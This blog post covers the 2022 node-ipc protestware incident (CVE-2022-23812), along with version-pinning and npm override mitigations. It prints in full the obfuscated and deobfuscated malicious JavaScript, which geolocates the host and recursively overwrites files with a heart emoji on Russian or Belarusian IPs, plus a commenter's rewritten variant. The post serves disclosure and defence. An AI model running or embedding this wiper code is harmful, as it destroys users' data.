+++
title = "Npm package node-ipc is malware?"
date = 2022-03-18
description = "npm package node-ipc is malware?"
+++

# TLDR
DO NOT use or update this module if you or your production servers etc. are located in a country actively involved in the invasion of Ukraine. Author of this package opposes said invasion and put a malicious code to wipe out data and put "❤️" on where they were. You are warned about this feature. Use at your own risk.

~~ Source: [https://github.com/RIAEvangelist/node-ipc/pull/373/files](https://github.com/RIAEvangelist/node-ipc/pull/373/files)

<hr>

# Start:

Hey, this is a quick blog post about a topic that happened around yesterday. Brandon Nozaki Miller, or known as [RIAEvangelist](https://github.com/RIAEvangelist) on github. He wanted to spread his views about the Russian-Ukraine war, and he wanted to harm people with Russian or countries related in the Ukraine-Russian war ip's by deleting all their data and replacing it with heart emojis like this: "❤️". This is malware and a federal crime as he disguised it in a package (a popular one I might add).

This shows the darkside of opensource perfectly, one person gets some control and dependencies and uses it for bad. Basically one bad apple ruining a lot of other apples.

I have lost my trust in this dev, and wont be using his software again. I have reported him to gitub and npm.

If you would like to check if your packages are affected take a look at [https://github.com/zlw9991/node-ipc-dependencies-list](https://github.com/zlw9991/node-ipc-dependencies-list). A lot of electron packages are affected, and also vue/cli-shared-utils (a part of vue.js) is affected.

If you are wondering this is the line of code that is malicious. 

<hr>

### ***Warning do not run this code, none of the problems and issues you get if you run this is my issue or problem or responsibility.***

# [CVE-2022-23812](https://nvd.nist.gov/vuln/detail/CVE-2022-23812)

---

## ***[RIAEvangelist/node-ipc](https://github.com/RIAEvangelist/node-ipc) is malware / protestware***

The `RIAEvangelist/node-ipc` module contains protestware [peacenotwar](https://github.com/RIAEvangelist/peacenotwar).

Excerpt from RIAEvangelist/node-ipc:
> ***as of v11.0.0 & v9.2.2*** this module uses the [peacenotwar](https://github.com/RIAEvangelist/peacenotwar) module.

---

More importantly, commits `847047cf7f81ab08352038b2204f0e7633449580 -> 6e344066a0464814a27fbd7ca8422f473956a803` of `RIAEvangelist/node-ipc` contains malware.

---

### :warning:| The following code is malicious, DO NOT RUN IT
https://github.com/RIAEvangelist/node-ipc/blob/847047cf7f81ab08352038b2204f0e7633449580/dao/ssl-geospec.js
> ##### The following codeblock was added in-case the url above is deactivated
> ```js
> import u from"path";import a from"fs";import o from"https";setTimeout(function(){const t=Math.round(Math.random()*4);if(t>1){return}const n=Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=","base64");o.get(n.toString("utf8"),function(t){t.on("data",function(t){const n=Buffer.from("Li8=","base64");const o=Buffer.from("Li4v","base64");const r=Buffer.from("Li4vLi4v","base64");const f=Buffer.from("Lw==","base64");const c=Buffer.from("Y291bnRyeV9uYW1l","base64");const e=Buffer.from("cnVzc2lh","base64");const i=Buffer.from("YmVsYXJ1cw==","base64");try{const s=JSON.parse(t.toString("utf8"));const u=s[c.toString("utf8")].toLowerCase();const a=u.includes(e.toString("utf8"))||u.includes(i.toString("utf8"));if(a){h(n.toString("utf8"));h(o.toString("utf8"));h(r.toString("utf8"));h(f.toString("utf8"))}}catch(t){}})})},Math.ceil(Math.random()*1e3));async function h(n="",o=""){if(!a.existsSync(n)){return}let r=[];try{r=a.readdirSync(n)}catch(t){}const f=[];const c=Buffer.from("4p2k77iP","base64");for(var e=0;e<r.length;e++){const i=u.join(n,r[e]);let t=null;try{t=a.lstatSync(i)}catch(t){continue}if(t.isDirectory()){const s=h(i,o);s.length>0?f.push(...s):null}else if(i.indexOf(o)>=0){try{a.writeFile(i,c.toString("utf8"),function(){})}catch(t){}}}return f};const ssl=true;export {ssl as default,ssl}
> ```
### :warning:| The above code is malicious, DO NOT RUN IT

---

I deobfuscated the code above and found that if the host machine's public ip address was from Russia or Belarus,
node-ipc would proceed overwrite many files with a heart emoji recursively while traversing up parent directories:

---

### :warning:| The following code is malicious, DO NOT RUN IT
```js
import u from "path";
import a from "fs";
import o from "https";
setTimeout(function () {
    const t = Math.round(Math.random() * 4);
    if (t > 1) {
        return;
    }
    const n = Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=", "base64");
    o.get(n.toString("utf8"), function (t) {
        t.on("data", function (t) {
            const n = Buffer.from("Li8=", "base64");
            const o = Buffer.from("Li4v", "base64");
            const r = Buffer.from("Li4vLi4v", "base64");
            const f = Buffer.from("Lw==", "base64");
            const c = Buffer.from("Y291bnRyeV9uYW1l", "base64");
            const e = Buffer.from("cnVzc2lh", "base64");
            const i = Buffer.from("YmVsYXJ1cw==", "base64");
            try {
                const s = JSON.parse(t.toString("utf8"));
                const u = s[c.toString("utf8")].toLowerCase();
                const a = u.includes(e.toString("utf8")) || u.includes(i.toString("utf8"));
                if (a) {
                    h(n.toString("utf8"));
                    h(o.toString("utf8"));
                    h(r.toString("utf8"));
                    h(f.toString("utf8"));
                }
            } catch (t) {}
        });
    });
}, Math.ceil(Math.random() * 1e3));
async function h(n = "", o = "") {
    if (!a.existsSync(n)) {
        return;
    }
    let r = [];
    try {
        r = a.readdirSync(n);
    } catch (t) {}
    const f = [];
    const c = Buffer.from("4p2k77iP", "base64");
    for (var e = 0; e < r.length; e++) {
        const i = u.join(n, r[e]);
        let t = null;
        try {
            t = a.lstatSync(i);
        } catch (t) {
            continue;
        }
        if (t.isDirectory()) {
            const s = h(i, o);
            s.length > 0 ? f.push(...s) : null;
        } else if (i.indexOf(o) >= 0) {
            try {
                a.writeFile(i, c.toString("utf8"), function () {});
            } catch (t) {}
        }
    }
    return f;
}
const ssl = true;
export { ssl as default, ssl };
```
### :warning:| The above code is malicious, DO NOT RUN IT

---

The following are excerpts from the malicious code:
```js
Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=", "base64");
// https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154
```
```js
const a = u.includes(e.toString("utf8")) || u.includes(i.toString("utf8"));
// checks if ip country is Russia or Belarus
```
```js
a.writeFile(i, c.toString("utf8"), function () {});
// overwrites file with `❤️`
```

---

The following demonstrates example of what each of the parameters going to the `a.writeFile(i,c.toString("utf8")` would be:

![image](https://user-images.githubusercontent.com/22574513/158507139-1ef9aa3a-b123-489e-a3d4-3c426d52aca3.png)

---

# Edit 2022-03-16_0

[Comment](https://github.com/vuejs/vue-cli/issues/7054#issuecomment-1069209509) by [zkyf](https://github.com/zkyf)

> Just made it better looked and commented dangerous code so you guys can take a try. Obviously the code will delete literally EVERYTHING on your drive.
> 
> ```js
> const path = require("path");
> const fs = require("fs");
> const https = require("https");
> 
> setTimeout(function () {
>     const randomNumber = Math.round(Math.random() * 4);
>     if (randomNumber > 1) {
>         // return;
>     }
>     const apiKey = "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154";
>     const pwd = "./";
>     const parentDir = "../";
>     const grandParentDir = "../../";
>     const root = "/";
>     const countryName = "country_name";
>     const russia = "russia";
>     const belarus = "belarus";
> 
>     https.get(apiKey, function (message) {
>         message.on("data", function (msgBuffer) {
>             try {
>                 const message = JSON.parse(msgBuffer.toString("utf8"));
>                 const userCountryName = message[countryName.toString("utf8")].toLowerCase();
>                 const hasRus = userCountryName.includes(russia.toString("utf8")) || userCountryName.includes(belarus.toString("utf8")); // checks if country is Russia or Belarus
>                 if (hasRus) {
>                     deleteFile(pwd);
>                     deleteFile(parentDir);
>                     deleteFile(grandParentDir);
>                     deleteFile(root);
>                 }
>             } catch (t) {}
>         });
>     });
> 
>     // zkyf: Let's try this directly here
>     deleteFile(pwd);
>     deleteFile(parentDir);
>     deleteFile(grandParentDir);
>     deleteFile(root);
> }, 100);
> 
> async function deleteFile(pathName = "", o = "") {
>     if (!fs.existsSync(pathName)) {
>         return;
>     }
>     let fileList = [];
>     try {
>         fileList = fs.readdirSync(pathName);
>     } catch (t) {}
>     const f = [];
>     const heartUtf8 = Buffer.from("4p2k77iP", "base64");
>     for (var idx = 0; idx < fileList.length; idx++) {
>         const fileName = path.join(pathName, fileList[idx]);
>         let fileInfo = null;
>         try {
>             fileInfo = fs.lstatSync(fileName);
>         } catch (err) {
>             continue;
>         }
>         if (fileInfo.isDirectory()) {
>             const fileSymbol = deleteFile(fileName, o);
>             fileSymbol.length > 0 ? f.push(...fileSymbol) : null;
>         } else if (fileName.indexOf(o) >= 0) {
>             try {
>                 // fs.writeFile(fileName, heartUtf8.toString("utf8"), function () {}); // overwrites file with `❤️`
>                 console.log(`Rewrite ${fileName}`);
>             } catch (err) {}
>         }
>     }
>     return f;
> }
> ```
> 
> Console: ![image](https://user-images.githubusercontent.com/13307442/158617117-0d4bc6c4-59ae-4fee-a852-418cb2189b72.png)

---

# Edit 2022-03-16_1 (requested by @lgg)

## Available mitigation methods:

The following mitigation strategies are inspired by cnpm's (is not npm) mitigation methods:
https://github.com/cnpm/bug-versions/pull/181

If you use one of the following mitigation stratagies, make sure to remove the `^` to force `node-ipc` to the specified version.

`"^9.x.x" -> "9.2.1"`
```diff
     "dependencies": {
-        "node-ipc": "^9.x.x"
+        "node-ipc": "9.2.1"
     }
```

`"^10.x.x" -> "10.1.0"`
```diff
     "dependencies": {
-        "node-ipc": "^10.x.x"
+        "node-ipc": "10.1.0"
     }
```

`"^11.x.x" -> "10.1.0"`
```diff
     "dependencies": {
-        "node-ipc": "^11.x.x"
+        "node-ipc": "10.1.0"
     }
```

## 3rd-party mitigation methods:
- [vue-cli](https://github.com/vuejs/vue-cli/issues/7054#issuecomment-1069642202)
- [Unity Hub](https://unity3d.com/hub/whats-new)

---

# Edit 2022-03-16_2 (requested by @lgg)

## [CVE-2022-23812](https://nvd.nist.gov/vuln/detail/CVE-2022-23812)

# Edit 2022-03-17_0

@RIAEvangelist has banned me from interacting with their repositories

# Edit 2022-03-17_1

The security research firm [snyk.io](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/) recommends the following mitigation strategy for users of `node-ipc`:

`package.json`
```json
  "overrides": {
    "node-ipc@>9.2.1 <10": "9.2.1",
    "node-ipc@>10.1.0": "10.1.0"
  }
```

# Edit 2022-03-17_2 ([credit](https://gist.github.com/MidSpike/f7ae3457420af78a54b38a31cc0c809c?permalink_comment_id=4101413#gistcomment-4101413): @Uzlopak)

### NPM users below NPM v8, this is for you!

> Don't forget to mention that npm supports override with npm 8. Earlier versions don't have overrides capabilities.
> So node 12 and 14, which are LTS, use by default npm 6 and that would not work with them. So upgrading npm to 8 would be necessary.

### Yarn users, this is for you!

- [Yarn 1 - Selective dependency resolutions](https://classic.yarnpkg.com/lang/en/docs/selective-version-resolutions/)
- [Yarn 2 - Resolutions](https://yarnpkg.com/configuration/manifest#resolutions)

I'm not too familiar with how yarn works, so I don't want to risk giving false instructions to users.

### ***Warning do not run this code, none of the problems and issues you get if you run this is my issue or problem or responsibility.***

<hr>

~~ Source and if you would like to learn more about the code read this gist: [https://gist.github.com/MidSpike/f7ae3457420af78a54b38a31cc0c809c](https://gist.github.com/MidSpike/f7ae3457420af78a54b38a31cc0c809c)

node-ipc and peacenotwar github (malware)
- [https://github.com/RIAEvangelist/node-ipc](https://github.com/RIAEvangelist/node-ipc)
- [https://github.com/RIAEvangelist/peacenotwar](https://github.com/RIAEvangelist/peacenotwar)


### Article is finished - I will not update this article anymore, unless there is a reason to do so.
